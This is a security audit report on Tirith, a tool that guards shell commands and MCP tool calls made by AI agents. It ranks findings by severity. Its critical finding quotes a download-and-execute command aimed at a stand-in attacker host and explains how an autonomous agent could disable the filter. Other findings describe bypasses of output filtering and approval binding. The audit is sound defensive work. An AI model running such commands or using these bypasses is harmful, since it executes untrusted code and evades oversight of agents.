# Security verdict

Not release-ready. I manually audited the tracked repository at commit `d7ce6b3689da539e6e7e11cc4f2ac66bc6bba7ad` without the Codex Security plugin. No source files were changed.

## Critical

1. **Autonomous MCP commands can disable Tirith with `TIRITH=0`.** Gateway calls are incorrectly marked interactive and use the bypass-aware analyzer. An agent can submit `TIRITH=0 curl https://attacker/x | sh` and have it forwarded as Allow. Fix by making gateway analysis non-interactive and bypass-blind. [gateway.rs](/Users/home/security/crates/tirith/src/cli/gateway.rs:3066), [policy.rs](/Users/home/security/crates/tirith-core/src/policy.rs:1050), [engine.rs](/Users/home/security/crates/tirith-core/src/engine.rs:2612)

## High severity

1. **Release diff can Allow a malicious wheel.** It carries only native findings and omits startup-hook and RECORD findings already present in both releases. Standalone inspection blocks the wheel, while diff can Allow it. [release_diff.rs](/Users/home/security/crates/tirith-core/src/artifact/release_diff.rs:295)

2. **Self-update accepts foreign Sigstore identities.** The unanchored identity regex can match an unrelated GitHub workflow whose ref contains the repository name. The shell installer also accepts any workflow in this repository rather than only tagged `release.yml`. [selfupdate.rs](/Users/home/security/crates/tirith/src/cli/selfupdate.rs:25), [install.sh](/Users/home/security/scripts/install.sh:146)

3. **Malformed daemon PID data can invoke `kill(-1, SIGTERM)`.** A stored `4294967295` is parsed as `u32`, cast to signed `pid_t`, and signals every process the user can signal. Socket reachability is not bound to that PID. [daemon.rs](/Users/home/security/crates/tirith/src/cli/daemon.rs:905), [daemon.rs](/Users/home/security/crates/tirith/src/cli/daemon.rs:1148)

4. **Duplicate MCP server names can erase real lockfile drift.** Added and removed entries are paired using the first matching name, ignoring source configuration, allowing a safe→malicious replacement to cancel out. [mcp_lock.rs](/Users/home/security/crates/tirith-core/src/mcp_lock.rs:3133)

5. **MCP approval does not bind interpreted code.** Approving `python3 server.py` hashes Python and the argument text, but not `server.py` or its dependency closure. The script can be replaced after approval without invalidating the fingerprint. [gateway.rs](/Users/home/security/crates/tirith/src/cli/gateway.rs:1577)

6. **Malformed MCP output bypasses enabled filtering.** When `result.content` has an unexpected shape, the filter returns `None`; fail-open mode forwards the original hostile response. [gateway.rs](/Users/home/security/crates/tirith/src/cli/gateway.rs:4419), [gateway.rs](/Users/home/security/crates/tirith/src/cli/gateway.rs:4697)

7. **Gateway queues and pending maps are attacker-unbounded.** A fast upstream, stalled stdout, or request-ID flood can exhaust memory. Use bounded channels, pending limits and backpressure. [gateway.rs](/Users/home/security/crates/tirith/src/cli/gateway.rs:680), [gateway.rs](/Users/home/security/crates/tirith/src/cli/gateway.rs:2161)

8. **Bearer credentials can be committed into `mcp.lock`.** Secret detection misses flags such as `--gitlab-token glpat-...` and secret query parameters, then serializes their raw values. [mcp_lock.rs](/Users/home/security/crates/tirith-core/src/mcp_lock.rs:143), [mcp_lock.rs](/Users/home/security/crates/tirith-core/src/mcp_lock.rs:2288)

9. **Windows ACL lifecycle is unsafe.** Cleanup removes every allow ACE for the AppContainer SID, including pre-existing or concurrent grants; post-install allocation failure can also leave a grant permanently installed. [capsule_windows.rs](/Users/home/security/crates/tirith/src/cli/capsule_windows.rs:489), [capsule_windows.rs](/Users/home/security/crates/tirith/src/cli/capsule_windows.rs:700)

10. **Windows self-update permits PowerShell injection through `TEMP`.** Archive paths are interpolated unescaped into single-quoted `-Command` source. An apostrophe in an inherited temporary directory can inject commands, especially dangerous during elevated updates. [selfupdate.rs](/Users/home/security/crates/tirith/src/cli/selfupdate.rs:1466)

11. **Benchmark PR jobs receive repository write permissions.** Same-repository PR code runs benchmarks with `contents: write` and `pull-requests: write`. Split PR/read-only and main/push jobs. [bench.yml](/Users/home/security/.github/workflows/bench.yml:8)

## Medium severity

### MCP and policy

- Server-originated requests such as `sampling/createMessage` are raw passthrough by default. [gateway.rs](/Users/home/security/crates/tirith/src/cli/gateway.rs:3946)
- Multiple command aliases authorize only the first value but forward the complete request, creating parser-precedence ambiguity. [gateway.rs](/Users/home/security/crates/tirith/src/cli/gateway.rs:3556)
- The Secure profile is only a default, not a minimum; bundled configuration explicitly restores fail-open/warn-forward behavior. [gateway.rs](/Users/home/security/crates/tirith/src/cli/gateway.rs:241), [tirith-gateway.yaml](/Users/home/security/crates/tirith/assets/configs/tirith-gateway.yaml:31)
- Unknown YAML fields and invalid shell names silently fall back to weaker defaults. [gateway.rs](/Users/home/security/crates/tirith/src/cli/gateway.rs:99)
- Output sanitization defaults off and omits `resources/read`. [dispatcher.rs](/Users/home/security/crates/tirith-core/src/mcp/dispatcher.rs:277), [mcp_server.rs](/Users/home/security/crates/tirith/src/cli/mcp_server.rs:7)
- MCP config discovery checks a pathname, then separately follows it and performs an uncapped read, leaving a symlink/growth race. [mcp_lock.rs](/Users/home/security/crates/tirith-core/src/mcp_lock.rs:1782)
- Response inspection performs up to 64 synchronous DNS resolutions without a total deadline. [response_inspect.rs](/Users/home/security/crates/tirith-core/src/mcp/response_inspect.rs:168)
- `fail_mode: open` documentation disagrees with timeout behavior, and `timeout_ms: 0` can create rapid orphan analyzer threads. [gateway.rs](/Users/home/security/crates/tirith/src/cli/gateway.rs:333)
- Fish single-quote escapes are parsed using POSIX rules. My reproduction failed closed with `analysis_incomplete`, so this is not the claimed bypass, but valid Fish commands are misclassified/blocked. [tokenize.rs](/Users/home/security/crates/tirith-core/src/tokenize.rs:449)
- Alias/function scanning can miss shell-effective names such as `c"ur"l` because classification searches raw substrings. [aliases.rs](/Users/home/security/crates/tirith-core/src/aliases.rs:1205)

### Artifacts and updates

- Post-install RECORD completeness ignores missing, corrupt and unverifiable entries, allowing publication when only hash mismatches are counted. [install.rs](/Users/home/security/crates/tirith-core/src/artifact/install.rs:642)
- ZIP entry limits run after `ZipArchive::new` eagerly parses the central directory; millions of entries can exhaust memory first. [archive.rs](/Users/home/security/crates/tirith-core/src/artifact/archive.rs:369)
- Artifact hashing and inspection are separated by a mutable-inode TOCTOU window. [inspect.rs](/Users/home/security/crates/tirith-core/src/artifact/inspect.rs:208)
- A failed update overwrites the prior rollback binary before the new update is committed. [selfupdate.rs](/Users/home/security/crates/tirith/src/cli/selfupdate.rs:1573)
- Quarantine paths advertised as streaming buffer entire artifacts up to 512 MiB. [quarantine.rs](/Users/home/security/crates/tirith-core/src/artifact/quarantine.rs:625)
- An accepted 10 MiB LSP buffer consumed approximately 2.7 GiB RSS and remained in extraction for over five minutes during the repository test. Reduce the cap and remove repeated full-string allocations/scans. [lsp.rs](/Users/home/security/crates/tirith/src/cli/lsp.rs:206), [extract.rs](/Users/home/security/crates/tirith-core/src/extract.rs:2187)

### State, secrets and integrity

- Concurrent audit upload can delete events appended after the upload snapshot. [audit_upload.rs](/Users/home/security/crates/tirith-core/src/audit_upload.rs:197)
- Redaction covers Bearer but leaks Basic, Digest, custom and Proxy-Authorization credentials. [redact.rs](/Users/home/security/crates/tirith-core/src/redact.rs:403)
- Checkpoint metadata stores complete trigger commands, including inline credentials, in `meta.json`. [checkpoint.rs](/Users/home/security/crates/tirith-core/src/checkpoint.rs:358)
- Checkpoint source capture follows top-level symlinks and has stat/open races that can capture out-of-scope secrets with stale permissions. [checkpoint.rs](/Users/home/security/crates/tirith-core/src/checkpoint.rs:1751)
- Checkpoint blobs are published without syncing the file and blob directory before durable metadata. [checkpoint.rs](/Users/home/security/crates/tirith-core/src/checkpoint.rs:1789)
- RepeatCount escalation reads history and records the warning in separate transactions; concurrent commands can both avoid escalation. [escalation.rs](/Users/home/security/crates/tirith-core/src/escalation.rs:710)
- Persistence baselines collapse every symlink, oversized file and I/O error into one reusable “unsafe” digest, permanently blessing an uninspectable surface. [persistence.rs](/Users/home/security/crates/tirith-core/src/persistence.rs:318)

### Network, ThreatDB and licensing

- Safe Browsing sends full paths and dotted split-DNS internal names to Google, potentially leaking reset tokens and internal URLs. [threatdb_api.rs](/Users/home/security/crates/tirith-core/src/threatdb_api.rs:875)
- Supplemental feeds are not reconciled when the primary database is already current; enabling, retrying or disabling feeds can leave stale state active. [threatdb_cmd.rs](/Users/home/security/crates/tirith/src/cli/threatdb_cmd.rs:393)
- Legacy manifest selection occurs before authentication, so an invalid primary blocks a valid fallback and an older primary can beat a newer signed fallback. [threatdb_cmd.rs](/Users/home/security/crates/tirith/src/cli/threatdb_cmd.rs:1300)
- Supplemental feeds permit 256–512 MiB decoded bodies plus unbounded record vectors and clones, allowing multi-gigabyte amplification. [threatdb_feeds.rs](/Users/home/security/crates/tirith-core/src/threatdb_feeds.rs:26)
- The external-data updater writes files Cargo does not consume and downloads incompatible Unicode data without staging or schema/integrity checks. [update-data.sh](/Users/home/security/scripts/update-data.sh:6), [build.rs](/Users/home/security/crates/tirith-core/build.rs:49)
- One-time license receipt consumption is a state-changing GET. A leaked checkout capability can be consumed cross-site through an image/navigation request. [receipt.rs](/Users/home/security/tools/license-server/src/routes/receipt.rs:22)
- The published composite action uses mutable `github/codeql-action/upload-sarif@v3` rather than a commit SHA. [action.yml](/Users/home/security/action.yml:92)

### Containment and process lifecycle

- Linux reports `max_processes` enforced using only `RLIMIT_NPROC`, which privileged processes bypass. [linux.rs](/Users/home/security/crates/tirith-core/src/capsule/linux.rs:540)
- Windows temporary HOME is predictable, reused and never deleted. [windows.rs](/Users/home/security/crates/tirith-core/src/capsule/windows.rs:563)
- macOS calls `TempDir::keep()` and then drops ownership, leaking every capsule HOME. [capsule.rs](/Users/home/security/crates/tirith/src/cli/capsule.rs:5791)
- macOS run-to-completion waits only for the direct child; detached descendants can remain running after success. [capsule.rs](/Users/home/security/crates/tirith/src/cli/capsule.rs:1477)
- macOS reports handle isolation despite ignoring close failures and stopping at FD 1,048,576. [capsule.rs](/Users/home/security/crates/tirith/src/cli/capsule.rs:6033)
- Daemon startup uses non-atomic existence checks and unconditional cleanup, so concurrent starters can unlink the winner’s state. [daemon.rs](/Users/home/security/crates/tirith/src/cli/daemon.rs:672)
- The PowerShell hook fails open on checker errors while still advertising blocking protection. [powershell-hook.ps1](/Users/home/security/shell/lib/powershell-hook.ps1:220)
- A SID allocated with `LocalAlloc` is released using the incompatible `FreeSid`. [capsule_windows.rs](/Users/home/security/crates/tirith/src/cli/capsule_windows.rs:594)
- `Duration::MAX` can overflow a trusted-child deadline after spawning, panic, and leave the Unix child alive. [trusted_child.rs](/Users/home/security/crates/tirith-core/src/trusted_child.rs:2160)
- Windows environment blocks are neither sorted nor case-insensitively deduplicated. [capsule_windows.rs](/Users/home/security/crates/tirith/src/cli/capsule_windows.rs:877)
- Windows CPU enforcement counts user time only while reporting generic CPU-time coverage. [windows.rs](/Users/home/security/crates/tirith-core/src/capsule/windows.rs:446)

## Lower-priority bugs and hardening

- Dashboard checks the legacy ThreatDB path and reports v2-only installations absent. [dashboard.rs](/Users/home/security/crates/tirith-core/src/dashboard.rs:391)
- Clean Safe Browsing results are never cached and are repeatedly disclosed. [threatdb_api.rs](/Users/home/security/crates/tirith-core/src/threatdb_api.rs:676)
- Registry cache has no total entry/byte limit. [registry_api.rs](/Users/home/security/crates/tirith-core/src/registry_api.rs:1311)
- Self-update never verifies the extracted binary’s embedded version/target. [selfupdate.rs](/Users/home/security/crates/tirith/src/cli/selfupdate.rs:827)
- Resolver transport permits 256 MiB while artifact handling advertises 512 MiB. [resolver_broker.rs](/Users/home/security/crates/tirith-core/src/artifact/resolver_broker.rs:31)
- The documented Bash source loader uses `$0` instead of `BASH_SOURCE[0]`. [tirith.sh](/Users/home/security/shell/tirith.sh:20)
- Repo trust locks follow attacker-controlled lock paths. [trust.rs](/Users/home/security/crates/tirith/src/cli/trust.rs:218)
- Concurrent corrupt baseline-salt repair can leave live processes using different salts. [baseline.rs](/Users/home/security/crates/tirith-core/src/baseline.rs:230)
- Crontab execution failures are represented as a clean empty crontab. [persistence.rs](/Users/home/security/crates/tirith-core/src/persistence.rs:345)
- Receipt query commands do not bind filenames to embedded receipt IDs or fully validate records. [receipt.rs](/Users/home/security/crates/tirith-core/src/receipt.rs:979)
- Audit append/verification permits unbounded line, head and problem-state allocations. [audit.rs](/Users/home/security/crates/tirith-core/src/audit.rs:461)
- AppContainer security identity uses a collision-prone 64-bit FNV hash. [windows.rs](/Users/home/security/crates/tirith-core/src/capsule/windows.rs:275)
- The ignored local `threatdb-signing.key` is mode `0644`. It does not match the committed verification key, so it does not appear to be the production signing secret, but local fixture keys should still be `0600` or removed.
- The registry redirect test failed once because it assumed concurrent request-record ordering; it passed immediately in isolation. Make the fixture deterministic. [registry_api.rs](/Users/home/security/crates/tirith-core/src/registry_api.rs:1672)

## Dependency and validation results

- `cargo fmt --all -- --check`: passed.
- Strict workspace Clippy: passed.
- Rust 1.83 workspace check: passed.
- `cargo deny`: passed, but only because several advisories are ignored.
- Fresh `cargo audit`: failed with 7 vulnerabilities and 2 warnings. The active license-server graph contains old `quick-xml` and `rustls-webpki`; the current R2 put-only path does not appear to invoke the vulnerable XML/CRL APIs. The Quinn findings are lockfile-only on current targets, and the vulnerable `anyhow::downcast_mut` call is absent. Still upgrade/remove `rust-s3`, clean the lockfile, synchronize audit/deny policy and add `cargo audit` to CI.
- CLI, integration, core and tool suites passed apart from the reproducible LSP resource test and the one registry fixture flake noted above. License server/signing tools passed 43 tests.
- No tracked production credentials were found.
- Windows and Linux findings were source-validated but not runtime-tested on those operating systems.
- Existing untracked `.codex-c15/` and `.codex-stack/` trees were excluded as non-authoritative user-owned copies.

Recommended fix order: MCP bypass → release-diff enforcement → Sigstore/update trust → daemon/Windows ACL issues → MCP binding/output/resource limits → CI permissions/pinning → checkpoint/redaction/data lifecycle issues.
